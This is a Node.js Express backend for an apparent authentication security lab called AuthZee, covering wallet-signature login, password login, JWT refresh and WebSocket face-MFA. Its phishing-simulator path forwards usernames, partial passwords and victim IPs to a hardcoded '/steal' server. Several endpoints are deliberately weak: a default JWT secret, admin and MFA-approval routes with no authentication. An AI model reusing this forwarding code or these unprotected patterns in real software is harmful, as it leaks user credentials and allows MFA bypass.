// backend/src/index.js
require("dotenv").config()
const express = require("express")
const cors = require("cors")
const jwt = require("jsonwebtoken")
const { ethers } = require("ethers")
const { v4: uuidv4 } = require("uuid")
const fs = require("fs")
const path = require("path")
const bcrypt = require("bcryptjs")
const http = require("http")
const WebSocket = require("ws")

// Ensure fetch exists (Node 18+ has global fetch; this is just a safety net)
if (typeof fetch === "undefined") {
  global.fetch = (...args) =>
    import("node-fetch").then(({ default: f }) => f(...args))
}

const { initDemoUser, findUser } = require("../demoUsers")

const app = express()
const server = http.createServer(app) // HTTP + WS on same server
const wss = new WebSocket.Server({ server })

// ---------- CONFIG ----------
const PORT = process.env.PORT || 4001
const JWT_SECRET = process.env.JWT_SECRET || "secret"

// Windows phishing server (beep logic lives there)
const PHISH_SERVER_URL = "http://10.159.103.185:5000/steal"

// Global flag: set by /api/phishing/simulator-toggle
let phishingSimulatorEnabled = false

// React frontend can be from localhost or any LAN IP (dev)
app.use(
  cors({
    origin: (origin, cb) => {
      if (!origin) return cb(null, true)
      if (/^http:\/\/(localhost|\d+\.\d+\.\d+\.\d+):5173$/.test(origin)) {
        return cb(null, true)
      }
      return cb(null, false)
    },
    credentials: true,
  })
)
app.use(express.json())

// --- FILE STORAGE ---
const DATA_DIR = path.join(__dirname, "..", "data")
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true })

const USERS_FILE = path.join(DATA_DIR, "users.json")
const NONCES_FILE = path.join(DATA_DIR, "nonces.json")
const SESSIONS_FILE = path.join(DATA_DIR, "sessions.json")
const ACCESS_LOG_FILE = path.join(DATA_DIR, "access_logs.json")

const loadJSON = (file) => {
  try {
    return JSON.parse(fs.readFileSync(file, "utf8"))
  } catch {
    if (file === ACCESS_LOG_FILE) return []
    return {}
  }
}

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2))
}

function logAccess(entry) {
  const logs = loadJSON(ACCESS_LOG_FILE)
  logs.push({
    time: new Date().toISOString(),
    ip: entry.ip,
    userAgent: entry.userAgent,
    wallet: entry.wallet,
    authMethod: entry.authMethod || "wallet",
    action: entry.action || "login",
    passwordLength: entry.passwordLength ?? undefined,
  })
  saveJSON(ACCESS_LOG_FILE, logs)
}

// ========== NONCE ISSUANCE ==========
app.post("/api/nonce", (req, res) => {
  const { wallet, origin } = req.body
  if (!wallet || !ethers.isAddress(wallet)) {
    return res.status(400).json({ error: "Invalid wallet" })
  }

  const nonces = loadJSON(NONCES_FILE)
  const nonce = `authzee-${uuidv4()}`
  const now = Date.now()

  nonces[wallet.toLowerCase()] = {
    value: nonce,
    origin: origin || "http://localhost:5173",
    issuedAt: new Date(now).toISOString(),
    expiresAt: now + 5 * 60 * 1000,
  }

  saveJSON(NONCES_FILE, nonces)
  console.log("Nonce created for:", wallet)
  res.json({ nonce })
})

// ========== LOGIN WITH SIGNATURE ==========
app.post("/api/auth/login", async (req, res) => {
  const { wallet, signature, nonce, origin } = req.body
  if (!wallet || !signature || !nonce) {
    return res.status(400).json({ error: "Missing fields" })
  }
  if (!ethers.isAddress(wallet)) {
    return res.status(400).json({ error: "Invalid wallet" })
  }

  try {
    const walletLower = wallet.toLowerCase()

    const nonces = loadJSON(NONCES_FILE)
    const entry = nonces[walletLower]
    if (!entry || entry.value !== nonce) {
      return res.status(401).json({ error: "Invalid nonce" })
    }
    if (entry.expiresAt < Date.now()) {
      delete nonces[walletLower]
      saveJSON(NONCES_FILE, nonces)
      return res.status(401).json({ error: "Expired nonce" })
    }
    if (entry.origin && origin && entry.origin !== origin) {
      return res.status(401).json({ error: "Origin mismatch" })
    }

    const recovered = ethers.verifyMessage(entry.value, signature)
    if (recovered.toLowerCase() !== walletLower) {
      return res.status(401).json({ error: "Invalid signature" })
    }

    const users = loadJSON(USERS_FILE)
    if (!users[walletLower]) {
      users[walletLower] = {
        wallet: walletLower,
        createdAt: new Date().toISOString(),
        loginCount: 0,
      }
    }
    users[walletLower].loginCount += 1
    users[walletLower].lastLoginAt = new Date().toISOString()
    saveJSON(USERS_FILE, users)

    const accessToken = jwt.sign(
      { wallet: walletLower, type: "access", method: "wallet" },
      JWT_SECRET,
      { expiresIn: "15m" }
    )

    const refreshToken = jwt.sign(
      { wallet: walletLower, type: "refresh", method: "wallet" },
      JWT_SECRET,
      { expiresIn: "7d" }
    )

    const sessions = loadJSON(SESSIONS_FILE)
    sessions[walletLower] = {
      refreshToken,
      lastIssuedAt: new Date().toISOString(),
    }
    saveJSON(SESSIONS_FILE, sessions)

    logAccess({
      wallet: walletLower,
      ip: req.ip,
      userAgent: req.headers["user-agent"] || "",
      authMethod: "wallet",
      action: "login",
    })

    delete nonces[walletLower]
    saveJSON(NONCES_FILE, nonces)

    console.log("Login success (wallet):", walletLower)
    res.json({
      accessToken,
      refreshToken,
      user: users[walletLower],
      message: "Welcome!",
    })
  } catch (error) {
    console.error("Login error:", error)
    res.status(500).json({ error: "Login failed" })
  }
})

// ========== BASIC LOGIN (PASSWORD LAB + CONDITIONAL PHISH FORWARD) ==========
app.post("/api/auth/basic-login", async (req, res) => {
  try {
    const { username, password } = req.body || {}
    if (!username || !password) {
      return res
        .status(400)
        .json({ error: "Username and password required" })
    }

    const user = findUser(username)
    if (!user) {
      return res.status(401).json({ error: "Invalid credentials" })
    }

    const ok = await bcrypt.compare(password, user.passwordHash)
    if (!ok) {
      return res.status(401).json({ error: "Invalid credentials" })
    }

    const pseudoWallet = `user:${user.username}`

    const accessToken = jwt.sign(
      { wallet: pseudoWallet, type: "access", method: "password" },
      JWT_SECRET,
      { expiresIn: "15m" }
    )

    const refreshToken = jwt.sign(
      { wallet: pseudoWallet, type: "refresh", method: "password" },
      JWT_SECRET,
      { expiresIn: "7d" }
    )

    const sessions = loadJSON(SESSIONS_FILE)
    sessions[pseudoWallet] = {
      refreshToken,
      lastIssuedAt: new Date().toISOString(),
    }
    saveJSON(SESSIONS_FILE, sessions)

    // ONLY forward to Windows phishing server when simulator is enabled
    if (phishingSimulatorEnabled) {
      try {
        const controller = new AbortController()
        const timeout = setTimeout(() => controller.abort(), 1500)

        await fetch(PHISH_SERVER_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username,
            password: password.slice(0, 3) + "***",
            source: "AuthZee_password_lab",
            victimIP: req.ip,
            userAgent: req.headers["user-agent"]?.slice(0, 100) || "",
          }),
          signal: controller.signal,
        })

        clearTimeout(timeout)
        console.log(
          "🚨 PHISH FORWARDED TO",
          PHISH_SERVER_URL,
          "for user",
          username
        )
      } catch (e) {
        console.log(
          "Phishing forward failed (normal if server down):",
          e.message
        )
      }
    } else {
      console.log(
        "Phishing simulator OFF: not forwarding lab password for",
        username
      )
    }

    logAccess({
      wallet: pseudoWallet,
      ip: req.ip,
      userAgent: req.headers["user-agent"] || "",
      authMethod: "password",
      action: "login",
      passwordLength: password.length,
    })

    console.log("Login success (password lab):", username)
    res.json({ accessToken, refreshToken })
  } catch (err) {
    console.error("Basic login error:", err)
    res.status(500).json({ error: "Basic login failed" })
  }
})

// ========== REFRESH ACCESS TOKEN ==========
app.post("/api/auth/refresh", (req, res) => {
  const { refreshToken } = req.body
  if (!refreshToken) {
    return res.status(400).json({ error: "Missing refresh token" })
  }

  try {
    const decoded = jwt.verify(refreshToken, JWT_SECRET)
    if (decoded.type !== "refresh") {
      return res.status(401).json({ error: "Invalid token type" })
    }

    const sessions = loadJSON(SESSIONS_FILE)
    const record = sessions[decoded.wallet]
    if (!record || record.refreshToken !== refreshToken) {
      return res.status(401).json({ error: "Unknown refresh token" })
    }

    const newAccessToken = jwt.sign(
      {
        wallet: decoded.wallet,
        type: "access",
        method: decoded.method || "wallet",
      },
      JWT_SECRET,
      { expiresIn: "15m" }
    )

    res.json({ accessToken: newAccessToken })
  } catch (e) {
    console.error("Refresh error:", e)
    res.status(401).json({ error: "Invalid or expired refresh token" })
  }
})

// ========== PROTECTED USER INFO ==========
app.get("/api/user/me", (req, res) => {
  const auth = req.headers.authorization || ""
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : null
  if (!token) return res.status(401).json({ error: "Missing token" })

  try {
    const decoded = jwt.verify(token, JWT_SECRET)
    if (decoded.type !== "access") {
      return res.status(401).json({ error: "Wrong token type" })
    }

    if (decoded.method === "wallet") {
      const users = loadJSON(USERS_FILE)
      const user = users[decoded.wallet]
      if (!user) return res.status(404).json({ error: "User not found" })
      return res.json({ user, method: "wallet" })
    }

    return res.json({
      user: { wallet: decoded.wallet, labUser: true },
      method: "password",
    })
  } catch (e) {
    console.error("user/me error:", e)
    res.status(401).json({ error: "Invalid or expired token" })
  }
})

// ========== ADMIN LOGS ==========
app.get("/api/admin/access-logs", (req, res) => {
  const logs = loadJSON(ACCESS_LOG_FILE)
  if (!Array.isArray(logs)) return res.json([])
  res.json(logs.slice(-50))
})

app.post("/api/admin/access-logs/clear", (req, res) => {
  try {
    saveJSON(ACCESS_LOG_FILE, [])
    console.log("Access logs cleared by admin")
    res.json({ ok: true })
  } catch (e) {
    console.error("Clear logs error:", e)
    res.status(500).json({ error: "Failed to clear logs" })
  }
})

// ========== HEALTH CHECK ==========
app.get("/api/health", (req, res) => res.json({ status: "OK" }))

// ---------- MFA WEBSOCKET PART ----------
const deviceSockets = new Map()
const challenges = new Map()

wss.on("connection", (ws, req) => {
  const url = new URL(req.url, "http://localhost")
  if (url.pathname !== "/mfa/ws") {
    ws.close()
    return
  }

  const deviceId = url.searchParams.get("deviceId")
  if (!deviceId) {
    ws.close()
    return
  }

  console.log("Mobile connected for MFA, deviceId:", deviceId)
  deviceSockets.set(deviceId, ws)

  ws.on("close", () => {
    console.log("Mobile disconnected, deviceId:", deviceId)
    const current = deviceSockets.get(deviceId)
    if (current === ws) {
      deviceSockets.delete(deviceId)
    }
  })
})

function sendToDevice(deviceId, payload) {
  const ws = deviceSockets.get(deviceId)
  if (!ws || ws.readyState !== WebSocket.OPEN) return false
  ws.send(JSON.stringify(payload))
  return true
}

app.post("/api/mfa/start-face", (req, res) => {
  const { userId, deviceId } = req.body || {}
  if (!userId || !deviceId) {
    return res
      .status(400)
      .json({ ok: false, error: "userId and deviceId required" })
  }

  const challengeId = uuidv4()
  challenges.set(challengeId, {
    status: "pending",
    userId,
    deviceId,
    createdAt: Date.now(),
  })

  const ok = sendToDevice(deviceId, {
    type: "MFA_FACE_REQUEST",
    challengeId,
    userId,
    message: "New login request that needs face verification",
  })

  console.log("Created MFA face challenge", {
    challengeId,
    userId,
    deviceId,
    pushedToDevice: ok,
  })

  return res.json({ ok: true, challengeId, pushedToDevice: ok })
})

app.post("/api/face/approve", (req, res) => {
  const { challengeId } = req.body || {}
  if (!challengeId) {
    return res
      .status(400)
      .json({ ok: false, error: "challengeId required" })
  }

  const ch = challenges.get(challengeId)
  if (!ch) {
    return res
      .status(404)
      .json({ ok: false, error: "Unknown challengeId" })
  }
  if (ch.status === "approved") {
    return res.json({ ok: true, already: true })
  }

  ch.status = "approved"
  ch.approvedAt = Date.now()
  challenges.set(challengeId, ch)

  console.log("Face approved for challenge:", challengeId)
  return res.json({ ok: true })
})

app.get("/api/mfa/status", (req, res) => {
  const challengeId = req.query.challengeId
  if (!challengeId) {
    return res
      .status(400)
      .json({ ok: false, error: "challengeId required" })
  }
  const ch = challenges.get(challengeId)
  if (!ch) {
    return res
      .status(404)
      .json({ ok: false, error: "Unknown challengeId" })
  }
  return res.json({
    ok: true,
    status: ch.status,
  })
})

// Phishing simulator toggle – drives phishingSimulatorEnabled flag
app.post("/api/phishing/simulator-toggle", (req, res) => {
  const { enabled } = req.body || {}
  if (typeof enabled !== "boolean") {
    return res
      .status(400)
      .json({ ok: false, error: "enabled must be boolean" })
  }

  phishingSimulatorEnabled = enabled
  console.log("Phishing simulator toggled:", enabled ? "ON" : "OFF")

  return res.json({ ok: true })
})

// ---------- SERVER START ----------
initDemoUser().then(() => {
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`Backend + WebSocket on http://0.0.0.0:${PORT}`)
  })
})
